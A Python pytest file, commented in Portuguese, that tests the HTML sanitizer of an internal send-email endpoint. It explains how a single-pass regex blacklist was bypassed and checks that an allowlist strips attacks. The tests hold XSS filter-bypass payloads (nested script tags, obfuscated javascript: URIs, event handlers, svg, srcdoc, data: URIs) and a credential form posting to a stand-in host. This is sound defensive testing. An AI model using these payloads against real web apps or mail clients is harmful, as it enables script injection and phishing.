"""Sanitizacao do corpo HTML em POST /internal/send-email.

O filtro anterior eram quatro `re.sub` de blacklist em PASSADA UNICA. Remover
uma ocorrencia de um padrao de dentro de um texto RECONSTROI esse padrao a
partir das bordas — `javjavascript:ascript:` saia como `javascript:` intacto.
Alem disso a lista nao cobria `<svg>`, `<math>`, `srcdoc` nem `style`.

O que isso valia na pratica: qualquer usuario pode criar e enrolar um executor
dedicado dentro da sua cota, e este endpoint envia pela conta Resend da
plataforma, com dominio verificado. HTML arbitrario ali e phishing com SPF e
DKIM validos.

Estes testes cobrem o comportamento (o HTML que sai), nao a implementacao: se
um dia o nh3 for trocado por outra allowlist, eles continuam valendo.
"""
import pytest

from app.api.routers.internal_email_router import SendEmailRequest


def _limpa(html: str) -> str:
    return SendEmailRequest(to=["a@b.com"], subject="s", html=html).html


# Ancora benigna: o nh3 remove a tag proibida INTEIRA, e um corpo que sobra
# vazio e recusado por `validate_html_not_empty` — o que testaria o validador
# errado. Com a ancora, o corpo continua valido e da para afirmar sobre o que
# saiu (e o que ficou).
_ANCORA = "<p>relatório pronto</p>"


def _limpa_com_ancora(html: str) -> str:
    saida = _limpa(_ANCORA + html)
    assert "relatório pronto" in saida, "a âncora benigna não sobreviveu"
    return saida


# ── Bypasses por reconstrucao (a falha original) ─────────────────────────────

@pytest.mark.parametrize(
    "payload",
    [
        '<a href="javjavascript:ascript:alert(1)">x</a>',   # reconstroi "javascript:"
        '<a href="javascript:alert(1)">x</a>',              # direto
        '<a href="JaVaScRiPt:alert(1)">x</a>',              # caixa alternada
        '<a href="java\tscript:alert(1)">x</a>',            # tab no meio do esquema
    ],
)
def test_protocolo_javascript_nunca_sobrevive(payload):
    saida = _limpa_com_ancora(payload).lower().replace("\t", "").replace("\n", "")
    assert "javascript:" not in saida


@pytest.mark.parametrize(
    "payload",
    [
        "<scr<script>ipt>alert(1)</script>",   # reconstroi "<script>"
        "<script>alert(1)</script>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<script>alert(1)",                    # sem fechamento
    ],
)
def test_script_nunca_sobrevive(payload):
    assert "<script" not in _limpa_com_ancora(payload).lower()


@pytest.mark.parametrize(
    "payload",
    [
        "<img src=x onerror=alert(1)>",
        "<img src=x ononerrorerror=alert(1)>",   # reconstroi "onerror="
        "<img src=x onerror\n=alert(1)>",        # quebra de linha antes do '='
        "<body onload=alert(1)>",
    ],
)
def test_manipulador_de_evento_nunca_sobrevive(payload):
    saida = _limpa_com_ancora(payload).lower()
    assert "onerror" not in saida
    assert "onload" not in saida


# ── Tags que a blacklist antiga nem listava ──────────────────────────────────

@pytest.mark.parametrize(
    "payload,proibido",
    [
        ("<svg onload=alert(1)></svg>", "svg"),
        ("<math><mtext></mtext></math>", "math"),
        ('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>', "srcdoc"),
        ('<object data="x.swf"></object>', "object"),
        ('<form action="http://mal.co"><input name=senha></form>', "form"),
        ('<base href="http://mal.co/">', "base"),
        ('<p style="background:url(http://mal.co/rastreio)">x</p>', "style"),
    ],
)
def test_tag_ou_atributo_fora_da_allowlist_e_removido(payload, proibido):
    assert proibido not in _limpa_com_ancora(payload).lower()


@pytest.mark.parametrize(
    "payload",
    [
        '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">',
        '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    ],
)
def test_data_uri_e_removido(payload):
    """`data:` em <img>/<a> contrabandeia SVG com script em clientes que renderizam."""
    assert "data:" not in _limpa_com_ancora(payload).lower()


# ── O outro lado: o e-mail legitimo tem que continuar funcionando ────────────

def test_html_legitimo_e_preservado():
    entrada = (
        "<p>Olá <strong>Maria</strong>,</p>"
        '<p>O relatório <em>Uso do solo</em> ficou pronto. '
        '<a href="https://atlans.example.org/runs/abc">Ver execução</a>.</p>'
        "<ul><li>128 feições</li><li>3,4 s</li></ul>"
    )
    saida = _limpa(entrada)

    for trecho in ["<strong>Maria</strong>", "<em>Uso do solo</em>",
                   "https://atlans.example.org/runs/abc", "<li>128 feições</li>"]:
        assert trecho in saida


def test_tabela_e_imagem_https_sao_preservadas():
    entrada = (
        '<table border="1"><tr><th colspan="2">Resumo</th></tr>'
        '<tr><td>ok</td><td>2</td></tr></table>'
        '<img src="https://atlans.example.org/logo.png" alt="Atlans" width="120">'
    )
    saida = _limpa(entrada)

    assert "<table" in saida and "<th" in saida and "colspan" in saida
    assert "https://atlans.example.org/logo.png" in saida


def test_link_externo_recebe_rel_seguro():
    """`link_rel` fecha o tabnabbing sem depender do autor do workflow."""
    saida = _limpa('<a href="https://exemplo.com">x</a>')

    assert "noopener" in saida and "noreferrer" in saida


@pytest.mark.parametrize("esquema", ["https://atlans.example.org/x", "http://exemplo.com", "mailto:s@atlans.example.org"])
def test_protocolos_permitidos_passam(esquema):
    assert esquema in _limpa(f'<a href="{esquema}">x</a>')


# ── Interacao com o validador de corpo vazio ─────────────────────────────────

def test_corpo_que_fica_vazio_apos_sanitizacao_e_recusado():
    """Ordem dos validadores: sanitize_html roda antes de validate_html_not_empty.

    Sem isso, um corpo so com tags proibidas ia vazio ao Resend, voltava
    "Missing html or text field" e o except generico virava um 502 sem pista.
    """
    from pydantic import ValidationError

    with pytest.raises(ValidationError):
        _limpa("<script>alert(1)</script>")
